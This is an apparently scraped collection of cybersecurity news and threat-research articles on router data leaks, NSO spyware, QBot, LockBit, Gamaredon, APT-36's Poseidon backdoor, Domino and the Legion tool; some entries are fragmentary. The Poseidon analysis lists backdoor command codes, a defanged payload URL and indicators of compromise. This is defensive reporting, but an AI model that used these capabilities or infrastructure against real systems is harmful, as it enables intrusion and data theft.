      "title": "Recycled Core Routers Expose Sensitive Corporate Network Info",
      "text": " Cameron Camp had purchased a Juniper SRX240H router last year on eBay, to use in a honeypot network he was building to study remote desktop protocol (RDP) exploits, and attacks on Microsoft Exchange and industrial control systems (ICS) devices. When the longtime security researcher at Eset booted up the secondhand Juniper router, to his surprise it displayed a hostname.After taking a closer look at the device, Camp contacted Tony Anscombe, Eset's chief security evangelist, to alert him to what he found on the router. \"This thing has a whole treasure trove of Silicon Valley A-list software company information on it,\" Camp recalls telling Anscombe.\"We got very, very concerned,\" Camp says.Camp and Anscombe decided to test their theory that this could be the tip of the iceberg for other decommissioned routers still harboring information from their previous owners' networks. They purchased several more decommissioned core routers — four Cisco Systems ASA 5500, three Fortinet FortiGate, and 11 Juniper Networks SRX Series Services Gateway routers.After dropping a few from the mix after one failed to power up and another two were actually mirrored routers from a former cluster, they found that nine of the remaining 16 held sensitive core networking configuration information, corporate credentials, and data on corporate applications, customers, vendors, and partners. The applications exposed on the routers were from big-name software vendors used in many enterprises: Microsoft Exchange, Lync/Skype, PeopleSoft, Salesforce, Microsoft SharePoint, Spiceworks, SQL, VMWare Horizon View, voice over IP apps, File Transfer Protocol (FTP), and Lightweight Directory Access Protocol (LDAP) applications.The routers contained one or more set of IPSec or VPN credentials, or hashed root passwords, and each had sufficient data for the researchers to identify the actual previous owner/operator of the device. Nearly 90% included router-to-router authentication keys and details on applications connected to the networks, some 44% had network credentials to other networks (such as a supplier or partner), 33% included third-party connections to the network, and 22% harbored customer information.\"I have the entire network topology of their core infrastructure, both internal and external, like cloud assets,\" for example, Camp says.Camp says the discovery was a far cry from the malware he typically studies, and a lot less work for an attacker who happened upon one of these unwiped routers. \"I don't need a zero day, I have your router,\" quips Camp.\"They are the intersection upon everything that happens in your organization,\" Camp says of core routers. \"Everything touches the router,\" including many cloud services, he adds.Among the organizations whose information was exposed were a manufacturing company, a US law firm, managed services providers, an open source software firm, an events company, a telecommunications equipment supplier, a global data company, and a creative services company. Eset did not disclose the names of the organizations, but the researchers confirmed that they contacted all of them.The Silicon Valley software vendor was quick to respond, even awarding Camp a bug bounty that he then donated to the Electronic Freedom Foundation and the Tor Project. But that was the researchers' easiest disclosure.\"Once we stepped outside of the tech [sector], it was incredibly different\" and harder to disclose our findings, Anscombe notes. The other organizations didn't have processes or even people available to handle the disclosure information, he says.Meanwhile, one of the unwiped routers contained what Camp describes as a \"creepy\" remote administration interface.\"I was never sure if it was on purpose, but it was creepy, very low-level access, and from one of the countries with flags that we're [the US] not happy with right now,\" he says. \"It could be totally legit or that could be really bad. It was a little edgy to me.\"So how do you wipe a router that you want to retire? The good news is most routers are fairly easy to securely decommission, and the big three — Cisco, Fortinet, and Juniper — on their websites provide detailed guidelines for restoring devices to their factory default settings.With Juniper routers, for example, wiping the device is simple: \"Going to config setting and type 'delete,' hit 'Y' [to confirm] and now that router doesn't know who it is anymore,\" Camp says. The entire wiping process takes less than five minutes, including the post-deletion reboot.And if your organization already had disposed of routers that weren't properly wiped, Eset recommends rotating cryptographic keys in case an attacker were to get their hands on your old router and attempt to gain trusted access to your network. Zero trust can help here as well, they say.But that's still no guarantee that a malicious actor who buys your old router still couldn't use it to target your organization. \"Even if somebody goes and changes the credentials of the accounts being cached in router, potentially [the attacker has] got the app lists, so [they] can tell what apps are run internally locally or in the cloud,\" Abscombe says.That gives the attacker just enough intel to plan a targeted attack, according to Abscombe. \"If I know they're running [a specific version of] Exchange and that version had a CVE and they had not applied the patch … I suddenly know things about their network that can make them vulnerable,\" he says. If you buy a secondhand core router, and, like the researchers, find that it still contains the previous owner's information, Eset recommends disconnecting the router and moving it to a secured area and contacting your regional CISA office. They also say it's best to document your purchase process as a precaution for insurance or legal purposes.Copyright © 2023 Informa PLC Informa UK Limited is a company registered in England and Wales with company number 1072954 whose registered office is 5 Howick Place, London, SW1P 1WG."

      "title": "NSO Group escalates spyware tactics with 3 new iPhone zero-click exploit chains | SC Media",
      "text": "  The notorious NSO Group’s Pegasus spyware continues to pose a threat, despite reports it was winding down its operations. New zero-click exploits found by watchdogs at Citizen Lab targeted two different remote attack surfaces on iPhones running iOS 15 and 16.PWNYOURHOME and FINDMYPWN are the first zero-click exploits to remotely and simultaneously target two Apple attack surfaces, according to Citizen Lab researchers. The use of zero-click exploits against iOS is not new, as past research showed similar tactics against iOS 14 devices with the NSO Group's Pegasus spyware. The latest Citizen Lab research found three more zero-click exploits tied to the NSO Group being used to hack iOS 15 and iOS 16 devices. The tactics were discovered during their long-running investigation into NSO’s campaign against several Mexican human rights groups. Network defenders should take note that these new tactics demonstrate that NSO Group is escalating its attempts to stop researchers from analyzing their tactics by blocking all traces of infection. Even when they’re not successful, the group is certainly undermining these efforts.The first, PWNYOURHOME, is an iOS exploit that could enable an attacker to infiltrate the iMessage app to modify the HomeKit software. The issue was disclosed to Apple, which later fixed the vulnerability in the iOS 16.3.1 update.The attack is deployed in two phases, with each targeting a different iOS process. The first phase uses a daemon crash in the HomeKit app, then moves to download PNG images from the iMessage app, causing BlastDoor to crash. Citizen Lab could not determine how the exploit leaves BlastDoor, but they found the exploit later launches Pegasus through the iOS component called “mediaserverd.”Fortunately, it appears use of Apple’s Lockdown Mode feature can successfully block PWNYOURHOME attacks levied by the notorious spyware vendor, as the function alerted users to the attempted attack visible through the notification display.However, there are no indications NSO has stopped using the exploit, suggesting the group “may have figured out a way to correct the notification issue, such as by fingerprinting Lockdown Mode.”The second exploit, FINDMYPWN, effectively targets the fmfd process on the ‘Find My’ function of iOS 15.5 and iOS 15.6 devices. The exploit enables items to be written and deleted inside of the cache directory. Citizen Lab is limiting the forensic information it releases for the exploit, so as not to inform the NSO Group of possible evasion tactics.A final exploit was observed after the researchers reassessed earlier forensics. LATENTIMAGE first appeared in January 2022 impacting iOS 15 devices. Evidence suggests the exploit also uses the ‘Find My’ function, but it’s initial access point is not confirmed.For Citizen Lab, “the use of multiple attack surfaces should encourage developers to think holistically about device security, and treat the entire surface reachable through a single identifier as a single surface.”What’s more, “modern exploit mitigations like pointer authentication codes significantly reduce attacker freedom to execute arbitrary code on a device,” researchers wrote. But PWNYOURHOME shows that “real-world attackers can, and do, find practical ways around these mitigations, such as by repurposing signed pointers located at known offsets in the iOS shared cache.”As the NSO group continues these evasive tactics, Citizen Lab stressed that it’s “encouraging” that Lockdown Mode successfully notified targets of ongoing attacks. While no tool is a cure-all, the feature could go far in dampening the impact of similar attack methods.The voice of healthcare cybersecurity and policy for SC Media, CyberRisk Alliance, driving industry-specific coverage of what matters most to healthcare and continuing to build relationships with industry stakeholders.The new PCI DSS standard puts more focus on application security, with more tools, testing and documentation required of developers.GitHub has updated its Advanced Security platform available for Enterprise Cloud and Enterprise Server customers to provide new artificial intelligence-powered features in a bid to \"revolutionize\" secure app development, reports SecurityWeek.Vulnerabilities in API authorization have been named by Wallarm as the second greatest security risk facing APIs, emphasizing the ease of leveraging authorizations as backdoors as well as the urgent need to ensure authorization maintenance, reports SiliconAngle.Tue Aug 27 - Wed Aug 28Tue Dec 5On-Demand Event   \n        Copyright © 2023 CyberRisk Alliance, LLC All Rights Reserved.\n        This material may not be published, broadcast, rewritten or redistributed\n        in any form without prior authorization.\n      "

      "text": " Using Telegram as its command-and-control (C2) mechanism, a new strain of malware, a bot dubbed Zaraza, is capable of extracting login credentials from a victim's open browser and saving them to a file, as well as taking screenshots of open windows to be saved in a JPG file.The type of login credentials that it steals range from bank accounts to email accounts to online wallets, as well as other sensitive and valuable website targets. This information can provide attackers with the opportunity to commit severe crimes such as identity theft and financial fraud, as well as grant access to personal identifiable information (PII) and, especially in the era of remote work, business accounts. This variant of malware and what it allows attackers to do potentially opens the floodgates to financial loss and \"reputational damage,\" according to the analysis.\"To protect yourself against this malware,\" the Uptycs researchers wrote, \"you should update your passwords regularly, follow online security best practices such as using strong passwords and multi-factor authentication, and ensure regular software and security system updates.\" Copyright © 2023 Informa PLC Informa UK Limited is a company registered in England and Wales with company number 1072954 whose registered office is 5 Howick Place, London, SW1P 1WG."

      "title": "QBot Expands Initial Access Malware Strategy With PDF-WSF Combo",
      "text": " A recent surge in QBot Trojan attacks has been observed, spreading via malicious emails written in various languages, including English, German, Italian, and French. The emails are crafted using genuine business letters obtained by the attackers and urge the recipient to open an attached PDF file, which contains several layers of obfuscation that make its maliciousness less detectable by security tools.According to an analysis by Kaspersky this week, the campaign also uses the method of using reply-chain emails to make it more difficult for soon-to-be-victims to flag as malicious. As the name suggests, reply chain is the practice of accessing existing email exchanges from a listserv (or any location) and replying to them, making the interloping messages look legit, less suspicious, and believable.The campaign represents a change in tactics for the operators of QBot (aka QakBot or Pinkslipbot), who maintain an access-as-a-service offering that other cybercriminals use to deliver a range of second-stage malware to already-compromised targets. Initially discovered in 2007, QBot has undergone numerous modifications and enhancements over the years, resulting in its widespread distribution as one of the most actively propagated malware strains in 2020. These latest improvements help boost stealth and legitimacy, according to security researchers. For instance, the emails are crafted to change only minimal parts of the stolen documents; they may contain links or attachments that contain links to malicious sites.\"The WSF is obfuscated to evade detection which will download further payloads,\" explains Timothy Morris, chief security adviser at Tanium. \"The attack 'chaining', or using multiple steps, helps get past some protections since the full context of the nefarious behavior can't be observed as a single activity.\"Morris notes that the multiple phases in the attack flow, from the initial emails to payloads being downloaded to data exfiltration and theft requires a range of cybersecurity strategies to defend against.\"It is important to have a defense-in-depth strategy that includes detection, monitoring, and protection technologies at the endpoint, as well as Web, network, and email security that is up to date,\" he says. \"Also, training users to these types of threats is important.\"Darren Guccione, CEO and co-founder at Keeper Security, says potential targets should also be trained to recognize that, unlike phishing attempts that appear to come from random businesses or the government, the malicious file containing malware will appear to come from someone you've had past email conversations with.\"The threat actors hope to piggyback on your relationship and level of trust to get these contacts to download the files,\" he explains. \"Employees should avoid making risky clicks. Suspicious links should not be clicked and untrusted software should not be installed.\"Other email security best practices include verifying the email sender and content before downloading attachments, and hovering over embedded links to see the actual target URL. Also, defenders also should focus on making sure antivirus and anti-malware solutions are deployed and up to date, and secure endpoints, including PCs, servers, routers, and so on, keeping them patched.Guccione says the latest resurgence of QBot, along with new modules and evasion techniques being added, indicates active development of the malware, so companies should be vigilant when it comes to being prepared for the latest changes.\"It’s still a very capable adversary tool that defenders need to protect against,\" Guccione explains.Copyright © 2023 Informa PLC Informa UK Limited is a company registered in England and Wales with company number 1072954 whose registered office is 5 Howick Place, London, SW1P 1WG."

      "text": " Ransomware for Mac may raise alarm bells, though a closer examination of the binary reveals that it's not quite ready for prime time.However, he adds, \"I think this should be looked at as a harbinger of things to come. You have a very well funded and motivated, large ransomware group that's saying: 'Hey, we're setting our sights on on macOS.'\"Will Mac users be ready when ransomware finally comes for them?Saturday's discovery may be best characterized as Windows malware with macOS lipstick.In unpacking the code, Wardle discovered multiple strings related to Windows artifacts — like autorun.inf, ntuser.dat.log, and so on. The lone component indicating its OS intentions was a variable called \"apple_config.\"\"This is the only instance (I found) of any macOS specific references/customizations,\" Wardle noted in the analysis, appending that \"(The rest of the malware's binary simply looks like Linux code, compiled for macOS).\"There were other signs, too, that the developers hadn't yet completed their project. For example, the code was signed \"ad-hoc\" — a stand-in for, say, a stolen Apple Developer ID. This could be a placeholder for future RaaS customers, but for now, Wardle explains, \"this means if downloaded to a macOS system (i.e. deployed by the attackers) macOS won't let it run.\"Suffice it to say: LockBit hasn't breached the Apple dam just yet. But that doesn't mean Mac users can relax.\"Look at, traditionally, who the targets are for large ransomware attacks. It's the enterprises: hospitals, packaging facilities, these more traditional companies,\" Wardle points out. \"They are generally Windows-based.\"\"The pandemic and the work from home really spurred that,\" Wardle postulates. \"A lot of people have Mac computers. And as the younger generation enters the workforce — they are more comfortable with the Apple ecosystem.\"Following from that, he adds, \"hackers who are very opportunistic are realizing that a lot of their potential victims are now transitioning, and thus they need to evolve their malicious creations.\"So the question may not be whether ransomware groups will jump into macOS, but how soon. \"This,\" Wardle thinks, \"is really the million-dollar question.\"Luckily for Mac users, Apple has anticipated this ransomware D-Day, and has proactively gotten ahead of it. Wardle points to two primary defenses already built into the operating system.Firstly, he says, \"system files are under read-only conditions. So even if ransomware gets root access on a computer, it's still not going to be able to modify those critical files and lock or render the system inoperable.\"Second is TCC — short for Transparency, Consent, and Control.\"The idea is that certain directories — for example, the user's document directory, desktop, downloads, their browser folders, and cookies — are actually protected by the operating system,\" Wardle explains. If ransomware finds its way onto the system, \"it's going to run into TCC and it's not going to be able to access the files it wants to encrypt, without either another exploit or getting the user to explicitly approve the access.\"There's a caveat to that happy news though. \"Apple has done a great job implementing security mechanisms, but,\" Wardle warns, \"these features haven't been really tried and tested yet. Maybe hackers will start poking and find some flaws. TCC, for example, has been riddled with bypasses basically since day one.\"\"It would be naive to think that the attackers aren't going to improve their techniques and create more effective ransomware,\" he concludes. \"So, I think it's really great to be talking about this now.\"Copyright © 2023 Informa PLC Informa UK Limited is a company registered in England and Wales with company number 1072954 whose registered office is 5 Howick Place, London, SW1P 1WG."

It enables the email to have a malicious attachment and leverages email spoofing techniques to make it appear from a legitimate source.Observed adversary tactics, techniques, and procedures (TTPs), victimology, and infrastructure found in the SMTP server configuration overlap with previously identified Gamaredon activity.Gamaredon APT group is believed to be a Russian State-backed threat group linked to the Federal Security Service (FSB). Gamaredon is known for its cyberespionage activities, primarily targeting Ukrainian government entities. The group uses spear phishing emails and social engineering lures as a primary tactic.The threat actor used a generic web panel to craft and send phishing emails against Ukrainian government entities. This allowed the actor to automate the malware delivery process against specific targets entered by the attackers in the email recipient section of the panel's user interface.  Pivoted IP addresses overlap with previously reported Gamaredon activity (8).  EclecticIQ analysts discovered a publicly facing SMTP server 194[.]180[.]191[.]56 used in a spear phishing campaign against Ukrainian government entities in February 2023. The exposed SMTP server hosts a web panel for crafting and delivering spear phishing emails. Analysts assess with high confidence that the threat actor used this infrastructure to send large number of spear phishing emails automatically. Figure 1 shows two example phishing emails sent from the server:  Figure 1 - Example of phishing emails with malicious attachment sent in in February 2023.EclecticIQ analysts identified these two different spear-phishing emails sent from 194[.]180[.]191[.]56. Both of these emails contain a RAR archive file as an attachment, which are used to deliver the initial malware. Figures 2 and 3 showed two different malware execution flows, sent on Wed, 15 Feb 2023 17:10:18 +0200 and Wed, 08 Feb 2023 17:15:44 which are identical to previous Gamaredon campaigns (1).Figure 2 - Spear phishing email sent on Wednesday, 15 February 2023.Figure 3 - Spear phishing email sent it on Wednesday, 8 February 2023.Figure 4 shows the origin of the phishing email and spoofed email address:  Figure 4 - Source of phishing email.The server had port 80 open for use by the threat actor for crafting spear phishing emails via a simple user interface seen in figure 5.  Figure 5 - Web panel translated from Russian to English.The web panel allowed the threat actor to send emails using the hardcoded sender address pivn-kr@prokuratura[.]dp[.]ua. EclecticIQ analysts identified the same email address in a recent phishing email campaign sent to a Ukrainian military address on February 9, 2023 (5), indicating that the exposed panel was very likely used for malware delivery.EclecticIQ analysts identified that the “.htaccess” file on the exposed SMTP server was misconfigured. The ”.htaccess” file is a directory-level configuration to limit access to a web server from trusted IP addresses only. According to the Apache documentation, users must insert all IP filters inside the \"<RequireAll>\" tag (7). However, this tag was missing in the configuration used by threat actor.Analysts identified five IP addresses in the “.htaccess” file (figure 6):Figure 6 – Reconnaissance with gobuster (6) and pivoting.  The majority of the pivoted IP addresses are located in Moscow, Russia from the same server provider, Crelcom LLC (AS 6789). WHOIS records show that one of the IP addresses - 109[.]200[.]159[.]46 - was registered under the name Michael Tishin. The same name is also listed as registrant for another IP - 109[.]200[.]159[.]54. This IP was attributed to Gamaredon by BlackBerry on January 19, 2023 (8).The adversary TTPs and victimology overlap with Gamaredon activity previously reported by EclecticIQ and other researchers starting in 2020 (1).EclecticIQ analysts identified one IP address 109[.]200[.]159[.]59 in the “.htaccess” file that links to a spear phishing email submitted to VirusTotal on November 20, 2020. In May 2022, Cisco reported the campaign and attributed the activity to Gamaredon (2, 4).Figure 7 shows the connection between the pivoted IP addresses and malicious files uploaded to VirusTotal. The IP address links to a spear phishing email with a malicious attachment. The attachments exploit CVE-2017-0199, a Microsoft Office remote code execution vulnerability in Windows.Figure 7 – Link analysis for 109[.]200[.]159[.]59.Figure 8 shows that spear phishing email was sent to the Security Service of Ukraine (SSU) on November 19, 2020. It contained a malicious Word document attachment used for malware delivery. The email sender section was spoofed by threat actors to make the email look legitimate.Figure 8 – Content of the phishing email.Figure 9 displays the metadata of the spear phishing email. The \"X-Sender-IP\" field in the metadata reveals the IP address 109[.]200[.]159[.]59 of the sender. This IP address does not match the domain name (i.ua) in the “From” field, proving it is a spoofed email.Figure 9 – Metadata section inside phishing email.Once a victim opens the delivered malicious Word document, it will exploit CVE-2017-0199. If the exploitation is successful, then it will download a second-stage malware from the domain  erythrocephala[.]online, which has been attributed to Gamaredon.EclecticIQ analysts assess with high confidence that Russian government-linked APTs will continue to use social engineering tactics during cyberattacks against Ukraine. Additionally, they are expected to increasingly target NATO partners due to NATO's support of Ukraine during the Russian war.It is very likely that the threat actor will modify their TTPs to avoid detection that will increase their chances of success, especially during the malware delivery stage."

      "title": "Cyber Espionage in India: Decoding APT-36's New Linux Malware Campaign",
      "text": " KuppingerCole positions Uptycs a CSPM Technology LeaderKuppingerCole positions Uptycs a CSPM Technology LeaderThe Uptycs threat research team has discovered a new Linux malware, Poseidon, deployed by the APT-36 group, also known as Transparent Tribe. This Pakistan-based advanced persistent threat group is notorious for targeting Indian government organizations, military personnel, and defense contractors. Transparent Tribe used the Kavach authentication tool as a cover to deliver the Poseidon payload. Kavach is a two-factor authentication (2FA) solution provided by the Indian government for secure access to their email services. Transparent Tribe created a backdoored version of Kavach to target Linux users working for Indian government agencies. When a user interacts with the malicious version of Kavach, the genuine login page is displayed to distract them. Meanwhile, the payload is downloaded in the background, compromising the user's system. Poseidon is a second-stage payload malware associated with Transparent Tribe. It is a general-purpose backdoor that provides attackers with a wide range of capabilities to hijack an infected host. Its functionalities include logging keystrokes, taking screen captures, uploading and downloading files, and remotely administering the system in various ways. Primarily, Poseidon is distributed through malicious websites disguised as legitimate Indian government sites. Uptycs research found that the malware infrastructure, such as malicious domains, is linked to earlier APT-36 campaigns. This highlights the group's continued focus on the aforementioned Indian targets. Repercussions of this APT-36 attack could be significant, leading to loss of sensitive information, compromised systems, financial losses, and reputational damage. Moreover, as the Transparent Tribe is thought to be state-sponsored, its activities could escalate tensions between nations, potentially resulting in retaliatory cyberattacks. This highlights the importance of implementing robust cybersecurity measures and remaining vigilant against the ever-evolving threat landscape. APT-36, aka Transparent Tribe, primarily targets Indian government organizations, military personnel, and defense contractors. Its objective is usually to gather sensitive information, conduct cyber espionage, and compromise the security of its targets.APT-36 is known to have exploited various platforms, including Windows and Android. The bad actors often create fake websites and documents that mimic legitimate government entities or organizations. This can trick targeted users into revealing their credentials or downloading malware onto their systems. It has also used custom-developed malware such as the Crimson RAT (remote access trojan) for cyber espionage.Users can protect themselves by following these best practices: The Uptycs threat research team has uncovered an ELF malware sample (MD5: c82bf2c50900b89b66e9f62d68c415ab). It’s a compiled Python executable (Pyinstaller) of nearly 5 MB in size.Upon extraction, a possible entry point is at Kavach.pyc (Fig. 1). Next we’ll decompile it to produce its source code.Fig. 1 – Extraction of .pyc files from pyinstaller executable Seen in the Fig. 2 Python code, the ELF file distracts the user by opening the legitimate Kavach login page (Fig. 3). This is where 2FA is provided to Indian users wanting to access their government email service. But in the background, a malicious “bosshelp” file is downloaded from hxxps://sharing1[.]filesharetalk.com/bosshelp to the user’s ~/.local/share directory.Fig. 2 – Decompiled Python code This creates a crontab to periodically log the victim's machine “loginname” in /dev/shm/mycron.Fig. 3 – Legitimate Kavach login page to trick users Let's now examine the “bosshelp” second stage payload. “Checkin” keywordProcess nameOSPIDIP AddressHostnameUUID“Amd64aring” keyword(The integrity level is 3 if the process is elevated; otherwise it’s level 2.) Fig. 4 – C2 check-in The C2 was offline during our analysis. But the binary contained a switch case (Fig. 5) having a number of tasks (e.g., keylogging, injecting, screen capture, uploading/downloading files). Each task is associated with a TaskID shown in the following table.Fig. 5 – Switch case to perform various tasks COMMAND CODE (DECIMAL)TASKDESCRIPTION4ShellExecute shell commands5Screencapture_runTake a screenshot of victim’s desktop6Keylog_RunLogging keystrokes7DownloadDownload file from remote system8UploadUpload file to remote machine9LibInjectInject a library10Ps_runList processes running on machine11Sleep_runSleep time12cat_runRead contents inside the file13cd_runChange directory14lsList contents inside the directory15jxa_runJavascript for automation16keys_runRetrieve keys from Kerberos keychain17triagedirectorySearch target directory18sshauthAuthenticate to host using username and password pair19portscanScan target for open ports20main.getJoblistingGet list of current running jobs21main.killJobKill a process with given PID22cp_runCopy a file23drives_runList currently mounted drives along with their description24getuser_runList information about current user25mkdirCreate directory.26mvMove a file27pwdPrint working directory28rmDelete a file29getenvRetrieve current environment variables30setenvSet environment variables31unsetenvDelete environment variable32kill_runKill process with given PID33curl_runExecute curl command34xpc_runCross-process communication35socksSupport for SOCKS proxies36listtask_runGet list of running tasks37list_entitlements_RunList entitlements (permissions associated with a particular PID)38Execute_memoryExecute shellcode directly from the memory39jsimport_runTo load specified javascript module43dyld_inject_RunInject dynamic library This payload serves as an all-purpose backdoor.

It has previously executed many payloads in Windows and Android. Now APT 36 has started targeting Linux users, too. Sites such as Kavach, Rodra, and KSB were used in social engineering attacks to trick targeted users. Users should be extremely careful and double-check URLs before opening or downloading files. We could see new features/advancements from this APT group in the future. The Uptycs threat research team continuously monitors related malware campaigns to safeguard our clients and inform the broader security community. In addition to having YARA built-in and being armed with other advanced detection capabilities, Uptycs XDR users can easily scan for Poseidon. XDR contextual detection provides important details about identified malware. Users can navigate to the toolkit data section in the detection alert, then click a detected item to reveal its profile (Fig. 9). Fig. 9 – Uptycs EDR detection   File NameMD5Kavachc82bf2c50900b89b66e9f62d68c415abconfirmationId_ksb382285738bae358060011ad847e845d2confirmationId_rodra02796a813b79928c95b2475798a14688Bosshelpaeb3ad3426794d4e90de4d139e92ee4dBossstart21316422f8c7f0f3ab2b9a282cdacd03Bosstype7b163e400e481519d74e06c1116a5200Kavachelf9b64528352dd683e55eb308919a596fa sharing1[.]filesharetalk.com/bosshelpksboard[.]inrodra[.]intt1[.]apktrial[.]com70[.]34[.]214[.]252Get regular updates on all things Uptycs—from product updates to expert articles and much more"

      "text": "  A screen image of the ransom by the LockBit ransomware group. (Image provided by Recorded Future)LockBit, known for the effective evolution of its tactics, has again modified its variant. In one instance, the ransomware strain was seen targeting Mac devices — the first of its kind for a major ransomware operation.However, Wardle was quick to point out that while the fresh LockBit sample can indeed run on Apple products, “it’s basically the extent of its impact.” As noted, “The codesign utility shows that though it’s signed, it’s signed 'ad-hoc' (say vs. an Apple Developer ID).”“This means if downloaded to a macOS system, i.e. deployed by the attackers, macOS won’t let it run,” Wardle explained. “This is confirmed by the spctl utility which shows ‘invalid signature.’” The sample also suggests that it was initially designed to run on Windows. In fact, several sample strings contained nothing that specifically related to MacOS, which may mean the “code is simply a recompile of LockBit ransomware that targets Windows, Linux, and also VMWare ESXi.So while it’s notable that a LockBit sample has been found targeting MacOS, it’s unlikely the current variant will impact the average user, Wardle stressed. What’s important is to maintain ongoing conversations about detection and prevention of these kinds of threats.In another fresh campaign, the ransomware appears to rely on the source code of Conti, another highly effective variant. After Conti was disbanded in May 2021, an affiliate leaked the source code of the group that enabled other cybercrime groups to recover the code for future use.TrickBot was previously employed by the Conti group, which reaffirms the connection. But the BazaLoader tie “is a little more subtle.” Like Lockbit, the group has also been observed using the leaked Conti code.Glimps was also able to examine LockBit’s payment portal and the group’s ransom note, which found evidence of multiple fresh LockBit variants. The ransom note structure bore similarities to previous variants, while the newly detected strains rely on a string of random characters instead of the .lockbit extension.“The different results produced by the analyzes… confirm what we initially thought: We are indeed faced with variants of Lockbit that shamelessly rely on Conti code, the Lockbit Green version,” researchers wrote.Most recently, data showed LockBit was leveraging a ransomware-as-a-service (RaaS) model to continue its previous campaigns, which have effectively hindered traditional computer network defenses and mitigation.Known as LockBit Black, the variant was “more modular and evasive” than previous versions. Much like the Glimps’ findings, LockBit Black shares similarities with Black Matter and Black Cat ransomware.The voice of healthcare cybersecurity and policy for SC Media, CyberRisk Alliance, driving industry-specific coverage of what matters most to healthcare and continuing to build relationships with industry stakeholders.After admitting responsibility for compromising Sony, a Colonial Pipeline supplier, and a Hawai'i government site, the RansomedVC group has claimed that it will be ending operations due to the arrests of six of its affiliates, reports The Record, a news site by cybersecurity firm Recorded Future.U.S. advanced electronic components manufacturer Kyocera AVX Components Corporation has disclosed that 39,111 individuals around the world had their data compromised following a ransomware attack earlier this year, which has been claimed by the LockBit ransomware operation, reports BleepingComputer.Attack on the U.S. subsidiary of the Industrial & Commercial Bank of China disrupted Treasury trading in New York earlier this week.

      "text": " Ex-Conti ransomware members have teamed up with the FIN7 threat actors to distribute a new malware family named 'Domino' in attacks on corporate networks.Domino is a relatively new malware family consisting of two components, a backdoor named 'Domino Backdoor,' which in turn drops a 'Domino Loader' that injects an info-stealing malware DLL into the memory of another process.IBM's Security Intelligence researchers have been tracking ex-Conti and TrickBot members utilizing the new malware in attacks since February 2023.It should be noted that this new malware is unrelated to the HCL Domino (formerly IBM Domino) product.Since the fall of 2022, IBM researchers have been tracking attacks using a malware loader named 'Dave Loader' that is linked to former Conti ransomware and TrickBot members.However, more recently, IBM says they have seen Dave Loader installing the new Domino malware family.Most commonly, Dave Loader would drop 'Domino Backdoor,' which would then install 'Domino Loader.'Domino Backdoor is a 64-bit DLL that will enumerate system information, such as running processes, usernames, computer names, and send it back to the attacker's Command and Control server. The backdoor also receives commands to execute or further payloads to install.The backdoor was seen downloading an additional loader, Domino Loader, that installs an embedded .NET info-stealer called 'Nemesis Project.' It can also plant a Cobalt Strike beacon, for greater persistence.\"The Domino Backdoor is designed to contact a different C2 address for domain-joined systems, suggesting a more capable backdoor, such as Cobalt Strike, will be downloaded on higher value targets instead of Project Nemesis,\" explains the IBM researchers Charlotte Hammond and Ole Villadsen.Project Nemesis is a standard information-stealing malware that can collect credentials stored in browsers and applications, cryptocurrency wallets, and browser history.Threat actors, especially those who utilize ransomware, commonly partner with other threat groups to distribute malware and for initial access to corporate networks.Over time, the lines between the malware developers and the ransomware gangs have grown murky, making distinguishing between the two operations hard.IBM has attributed the Domino malware family to FIN7 due to a great deal of code overlap with Lizar (aka Tirion and DiceLoader), a post-exploitation toolkit associated with FIN7.Furthermore, IBM found that a loader named 'NewWorldOrder,' normally used in FIN7's Carbanak attacks, was recently used to push the Domino malware.So, in a confusing joint venture, we have Dave Loader (TrickBot/Conti) pushing the Domino (FIN7) malware, which in turn deploys Project Nemesis or Cobalt Strike beacons believed to be associated with ex-Conti member ransomware activity.This means that defenders have to deal with a confusing web of threat actors, all with malware allowing remote access to networks."

      "text": " Payment processing giant NCR disclosed a ransomware attack this weekend that caused an outage on its point of sale technology used widely by restaurants.The company told Recorded Future News that it discovered the ransomware attack on April 13, when a data center outage impacted some of their customers.The incident affected the company’s Aloha service – which provides restaurants with a system to manage point of sale hardware, online orders, marketing tools and more. NCR says the service is used by thousands of restaurants around the world.“Upon such determination, NCR immediately started contacting customers, enacted its cybersecurity protocol and engaged outside experts to contain the incident and begin the recovery process. The investigation into the incident includes NCR experts, external forensic cybersecurity experts and federal law enforcement,” a spokesperson said.“We believe this incident is limited to specific functionality in Aloha cloud-based services and Counterpoint. At this time, our ongoing investigation also indicates that no customer systems or networks are involved. None of our ATM, digital banking, payments, or other retail products are processed at this data center.”The spokesperson confirmed that the ransomware attack has impacted the ability of several restaurants to manage administrative functions. The company is now working on creating alternatives for those customers and restoring the impacted tools.On April 15, cybersecurity expert Dominic Alvieri said the BlackCat/AlphV ransomware group took credit for the attack, posting the company on its leak site.The group shared alleged messages between NCR representatives and BlackCat hackers, claiming that while no data was stolen during the attack, they were able to steal credentials that customers use to access their systems.NCR reported a revenue of more than $7 billion in 2021 through the sale of self-service kiosks, point-of-sale terminals, automated teller machines, check processing systems, and barcode scanners.The company, initially known as National Cash Register, was created in 1879 to sell the first mechanical cash register.Bugcrowd CEO Dave Gerry said point of sale systems remain an attractive target for hackers “given the business criticality of both the customer payment data and broader impact to business operations.”“This is a timely example reinforcing that cyberattacks impact more than just the primary target – in this case potentially thousands of small businesses that rely on the NCR Aloha POS Platform,” he said.Jonathan Greig is a Breaking News Reporter at Recorded Future News.

      "text": "  A simple mail transfer protocol (SMTP) abuse tool dubbed Legion can scan Shodan to identify misconfigured cloud servers and then take over SMTP email marketing programs or launch phishing campaigns.Legion can also send SMS text messages to launch mobile-based phishing and disinformation campaigns and has targeted 14 different telecoms, including AT&T, Sprint, T-Mobile, and Verizon. It can also bundle additional functionality traditionally found in more common hacking tools, such as the ability to execute web server specific exploit code and brute force account credentials. Matt Muir, a threat intelligence researcher at Cado, said security administrators can neutralize Legion by making sure their environment files are not exposed to the public internet. “Environment files are text files used to store credentials,” explained Muir. “By securing the environment files there’s not much Legion can do. Admins have to make sure that the environment files are not located in a directory that’s exposed to the internet.”Muir said Cado researchers consider Legion an emerging generation of cloud-focused credential harvester/spam utilities. Developers of these tools often steal each other's code, making attribution to a particular group difficult.“Mail and SMS abuse are big business for attackers,” wrote Ahl. “We have come across close to a dozen variants of similar scripts that are being sold regularly for nefarious purposes. Legion is not the first nor will it be the last.”The Telegram groups used to distribute Legion have a combined membership of about 5,000. Muir said although we can assume not everybody in these groups will purchase a license for the software, it’s clear that there’s now considerable demand for such a tool.“If even half of the members purchased a license and used the SMTP abuse capabilities for spam or phishing purposes, I don’t think it’s unreasonable to assume that tens of thousands of users would be affected,” said Muir, who also footnoted that at the time the blog was written, Cado researchers had seen zero detections on VirusTotal.“Attackers often look to get access to an API using credentials or tokens obtained through nefarious means,” said Rago. “Once they gain the valid privileged credential or token, the attacker can leverage the API to exfiltrate data or compromise a service.”Davis 